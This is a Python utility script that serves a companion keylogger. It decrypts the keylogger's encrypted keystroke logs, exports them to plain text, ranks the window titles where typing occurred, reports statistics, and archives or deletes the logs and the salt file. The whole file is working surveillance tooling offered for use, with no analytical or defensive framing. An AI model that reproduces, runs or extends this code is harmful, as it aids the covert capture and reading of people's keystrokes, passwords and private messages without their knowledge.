#!/usr/bin/env python3
"""
Utility script for managing encrypted keylogger logs with daily rotation
"""

import os
import sys
import argparse
import getpass
import glob
import datetime
import shutil

# Add the current directory to the path to import keylogger functions
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from keylogger import (
    derive_key_from_password, decrypt_message, 
    LOG_DIR, SALT_FILE, ARCHIVE_DIR
)

def get_all_log_files():
    """Get all available log files"""
    log_pattern = os.path.join(LOG_DIR, "*-log.enc")
    log_files = glob.glob(log_pattern)
    
    # Also check for old format log file
    old_log_file = os.path.join(LOG_DIR, "system.enc")
    if os.path.exists(old_log_file):
        log_files.append(old_log_file)
    
    return log_files

def export_logs_to_text():
    """Export decrypted logs to a plain text file"""
    log_files = get_all_log_files()
    
    if not log_files:
        print("No encrypted log files found!")
        return
    
    if not os.path.exists(SALT_FILE):
        print("No salt file found! Cannot decrypt logs.")
        return
    
    # Get password for decryption
    password = getpass.getpass("Enter decryption password: ")
    if not password:
        print("Password cannot be empty!")
        return
    
    try:
        # Get salt and derive key
        with open(SALT_FILE, 'rb') as f:
            salt = f.read()
        
        encryption_key = derive_key_from_password(password, salt)
        
        # Sort log files by date
        def extract_date(filename):
            basename = os.path.basename(filename)
            if basename == "system.enc":
                return datetime.datetime.min
            try:
                date_str = basename.split('-log.enc')[0]
                return datetime.datetime.strptime(date_str, '%Y-%m-%d')
            except:
                return datetime.datetime.min
        
        log_files.sort(key=extract_date)
        
        # Export to text file with timestamp
        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        export_file = f"keylog_decrypted_{timestamp}.txt"
        
        with open(export_file, 'w', encoding='utf-8') as text_file:
            text_file.write("Decrypted Keylogger Logs (Daily Rotation Format)\n")
            text_file.write("=" * 60 + "\n\n")
            text_file.write(f"Export Date: {datetime.datetime.now()}\n")
            text_file.write(f"Total Files: {len(log_files)}\n")
            text_file.write(f"Format: Enhanced with window titles\n\n")
            
            total_entries = 0
            entries_with_windows = 0
            
            for log_file in log_files:
                basename = os.path.basename(log_file)
                text_file.write(f"\n--- Log File: {basename} ---\n")
                
                try:
                    with open(log_file, 'rb') as encrypted_file:
                        file_entries = 0
                        file_windows = 0
                        for line_num, encrypted_line in enumerate(encrypted_file, 1):
                            encrypted_line = encrypted_line.strip()
                            if encrypted_line:
                                try:
                                    decrypted_entry = decrypt_message(encrypted_line, encryption_key)
                                    
                                    # Parse entry to check format
                                    parsed = parse_log_entry(decrypted_entry)
                                    if parsed['window_title'] != 'Unknown':
                                        entries_with_windows += 1
                                        file_windows += 1
                                    
                                    text_file.write(f"{decrypted_entry}\n")
                                    file_entries += 1
                                    total_entries += 1
                                except Exception as e:
                                    text_file.write(f"[ERROR DECRYPTING ENTRY {line_num}] - {e}\n")
                        
                        text_file.write(f"({file_entries} entries, {file_windows} with window info)\n")
                        
                except Exception as e:
                    text_file.write(f"[ERROR READING FILE] - {e}\n")
            
            text_file.write(f"\nTotal Entries: {total_entries}\n")
            text_file.write(f"Entries with Window Info: {entries_with_windows} ({entries_with_windows/total_entries*100:.1f}%)\n" if total_entries > 0 else "")
        
        print(f"Logs successfully exported to: {os.path.abspath(export_file)}")
        print(f"Total entries exported: {total_entries}")
        if total_entries > 0:
            print(f"Entries with window info: {entries_with_windows}/{total_entries} ({entries_with_windows/total_entries*100:.1f}%)")
        
    except Exception as e:
        print(f"Error exporting logs: {e}")

def parse_log_entry(decrypted_entry):
    """Parse a decrypted log entry and extract components"""
    try:
        # New format: "timestamp - [window_title] - key_info"
        # Old format: "timestamp - key_info"
        
        if ' - [' in decrypted_entry and '] - ' in decrypted_entry:
            # New format with window title
            parts = decrypted_entry.split(' - ', 2)
            if len(parts) >= 3:
                timestamp = parts[0]
                window_part = parts[1]
                key_info = parts[2]
                
                # Extract window title from brackets
                if window_part.startswith('[') and window_part.endswith(']'):
                    window_title = window_part[1:-1]
                else:
                    window_title = window_part
                
                return {
                    'timestamp': timestamp,
                    'window_title': window_title,
                    'key_info': key_info,
                    'format_version': 'v2'
                }
        
        # Fall back to old format
        parts = decrypted_entry.split(' - ', 1)
        if len(parts) >= 2:
            return {
                'timestamp': parts[0],
                'window_title': 'Unknown',
                'key_info': parts[1],
                'format_version': 'v1'
            }
        
        # Unable to parse
        return {
            'timestamp': 'Unknown',
            'window_title': 'Unknown',
            'key_info': decrypted_entry,
            'format_version': 'unknown'
        }
    except Exception:
        return {
            'timestamp': 'Unknown',
            'window_title': 'Unknown',
            'key_info': decrypted_entry,
            'format_version': 'error'
        }

def analyze_window_usage():
    """Analyze window usage from log files"""
    log_files = get_all_log_files()
    
    if not log_files:
        print("No encrypted log files found!")
        return
    
    if not os.path.exists(SALT_FILE):
        print("Salt file not found. Cannot decrypt logs.")
        return
    
    password = getpass.getpass("Enter decryption password: ")
    
    try:
        # Get salt and derive key
        with open(SALT_FILE, 'rb') as f:
            salt = f.read()
        
        encryption_key = derive_key_from_password(password, salt)
        
        window_stats = {}
        total_entries = 0
        entries_with_windows = 0
        
        print("Analyzing window usage from logs...")
        
        for log_file in log_files:
            try:
                with open(log_file, 'rb') as encrypted_file:
                    for encrypted_line in encrypted_file:
                        encrypted_line = encrypted_line.strip()
                        if encrypted_line:
                            try:
                                decrypted_entry = decrypt_message(encrypted_line, encryption_key)
                                parsed = parse_log_entry(decrypted_entry)
                                
                                total_entries += 1
                                window_title = parsed['window_title']
                                
                                if window_title != 'Unknown':
                                    entries_with_windows += 1
                                    if window_title in window_stats:
                                        window_stats[window_title] += 1
                                    else:
                                        window_stats[window_title] = 1
                                        
                            except Exception:
                                continue
            except Exception:
                continue
        
        # Display results
        print(f"\n📊 Window Usage Analysis")
        print("=" * 50)
        print(f"Total log entries: {total_entries:,}")
        print(f"Entries with window info: {entries_with_windows:,}")
        print(f"Unique windows: {len(window_stats)}")
        
        if window_stats:
            print(f"\n🏆 Top Windows by Activity:")
            print("-" * 50)
            
            # Sort by activity count
            sorted_windows = sorted(window_stats.items(), key=lambda x: x[1], reverse=True)
            
            for i, (window, count) in enumerate(sorted_windows[:10], 1):
                percentage = (count / entries_with_windows) * 100 if entries_with_windows > 0 else 0
                # Truncate long window titles
                display_title = window[:45] + "..." if len(window) > 48 else window
                print(f"{i:2d}. {display_title:<48} {count:6,} ({percentage:5.1f}%)")
            
            if len(sorted_windows) > 10:
                remaining = len(sorted_windows) - 10
                remaining_count = sum(count for _, count in sorted_windows[10:])
                remaining_pct = (remaining_count / entries_with_windows) * 100 if entries_with_windows > 0 else 0
                print(f"    ... and {remaining} more windows {'':<32} {remaining_count:6,} ({remaining_pct:5.1f}%)")
                
        else:
            print("\nNo window information found in logs.")
            print("This might be an older log format or window capture is not working.")
        
    except Exception as e:
        print(f"Error analyzing window usage: {e}")

def get_log_stats():
    """Display statistics about all encrypted log files"""
    log_files = get_all_log_files()
    
    if not log_files:
        print("No encrypted log files found!")
        return
    
    # Sort by date
    def extract_date(filename):
        basename = os.path.basename(filename)
        if basename == "system.enc":
            return datetime.datetime.min
        try:
            date_str = basename.split('-log.enc')[0]
            return datetime.datetime.strptime(date_str, '%Y-%m-%d')
        except:
            return datetime.datetime.min
    
    log_files.sort(key=extract_date, reverse=True)
    
    print(f"Log File Statistics:")
    print(f"  Log Directory: {os.path.abspath(LOG_DIR)}")
    print(f"  Archive Directory: {os.path.abspath(ARCHIVE_DIR)}")
    print(f"  Salt file exists: {'Yes' if os.path.exists(SALT_FILE) else 'No'}")
    print()
    
    total_size = 0
    total_entries = 0
    
    print(f"{'Filename':<20} {'Date':<12} {'Size':<12} {'Entries':<8}")
    print("-" * 55)
    
    for log_file in log_files:
        basename = os.path.basename(log_file)
        
        try:
            size = os.path.getsize(log_file)
            size_str = f"{size:,} B"
            total_size += size
        except:
            size_str = "Unknown"
        
        # Extract date
        if basename == "system.enc":
            date_str = "Legacy"
        else:
            try:
                date_str = basename.split('-log.enc')[0]
            except:
                date_str = "Unknown"
        
        # Count entries
        try:
            with open(log_file, 'rb') as f:
                entries = sum(1 for line in f if line.strip())
            entries_str = str(entries)
            total_entries += entries
        except:
            entries_str = "?"
        
        print(f"{basename:<20} {date_str:<12} {size_str:<12} {entries_str:<8}")
    
    print("-" * 55)
    print(f"{'Total:':<20} {len(log_files)} files {'':<1} {total_size:,} B {'':<1} {total_entries}")
    
    # Check for archived files
    if os.path.exists(ARCHIVE_DIR):
        archived_files = glob.glob(os.path.join(ARCHIVE_DIR, "*-log.enc"))
        if archived_files:
            print(f"\nArchived files: {len(archived_files)} files in {ARCHIVE_DIR}")
    
    print(f"\n💡 Use 'python log_utils.py --windows' to analyze window usage")

def delete_logs():
    """Delete encrypted logs after confirmation"""
    log_files = get_all_log_files()
    
    if not log_files and not os.path.exists(SALT_FILE):
        print("No log files found to delete.")
        return
    
    print("WARNING: This will permanently delete all encrypted logs!")
    print(f"Files to be deleted: {len(log_files)} log files")
    if os.path.exists(SALT_FILE):
        print("                     1 salt file")
    if os.path.exists(ARCHIVE_DIR):
        archived_files = glob.glob(os.path.join(ARCHIVE_DIR, "*-log.enc"))
        if archived_files:
            print(f"                     {len(archived_files)} archived files")
    
    confirm = input("Type 'DELETE' to confirm: ")
    
    if confirm == 'DELETE':
        try:
            deleted_count = 0
            
            # Delete current log files
            for log_file in log_files:
                os.remove(log_file)
                deleted_count += 1
                print(f"Deleted: {os.path.basename(log_file)}")
            
            # Delete salt file
            if os.path.exists(SALT_FILE):
                os.remove(SALT_FILE)
                print(f"Deleted: {os.path.basename(SALT_FILE)}")
            
            # Delete archived files
            if os.path.exists(ARCHIVE_DIR):
                archived_files = glob.glob(os.path.join(ARCHIVE_DIR, "*-log.enc"))
                for archived_file in archived_files:
                    os.remove(archived_file)
                    deleted_count += 1
                    print(f"Deleted archived: {os.path.basename(archived_file)}")
                
                # Remove archive directory if empty
                try:
                    os.rmdir(ARCHIVE_DIR)
                    print(f"Removed empty archive directory")
                except OSError:
                    pass  # Directory not empty
            
            print(f"\nAll log files have been deleted. Total: {deleted_count} files")
            
        except Exception as e:
            print(f"Error deleting files: {e}")
    else:
        print("Deletion cancelled.")

def archive_logs():
    """Manually archive current log files"""
    log_files = get_all_log_files()
    
    if not log_files:
        print("No log files found to archive.")
        return
    
    # Create archive directory
    os.makedirs(ARCHIVE_DIR, exist_ok=True)
    
    archived_count = 0
    
    for log_file in log_files:
        try:
            basename = os.path.basename(log_file)
            archive_file = os.path.join(ARCHIVE_DIR, basename)
            
            if not os.path.exists(archive_file):
                shutil.copy2(log_file, archive_file)
                archived_count += 1
                print(f"Archived: {basename}")
            else:
                print(f"Already archived: {basename}")
        except Exception as e:
            print(f"Error archiving {basename}: {e}")
    
    print(f"\nArchived {archived_count} files to: {ARCHIVE_DIR}")

def main():
    """Main function with command line options"""
    parser = argparse.ArgumentParser(description="Encrypted Keylogger Utilities (Daily Rotation)")
    parser.add_argument('--export', action='store_true', 
                       help='Export decrypted logs to a text file')
    parser.add_argument('--stats', action='store_true',
                       help='Show log file statistics')
    parser.add_argument('--delete', action='store_true',
                       help='Delete all encrypted log files')
    parser.add_argument('--archive', action='store_true',
                       help='Manually archive current log files')
    parser.add_argument('--windows', action='store_true',
                       help='Analyze window usage from logs')
    
    args = parser.parse_args()
    
    if args.export:
        export_logs_to_text()
    elif args.stats:
        get_log_stats()
    elif args.delete:
        delete_logs()
    elif args.archive:
        archive_logs()
    elif args.windows:
        analyze_window_usage()
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
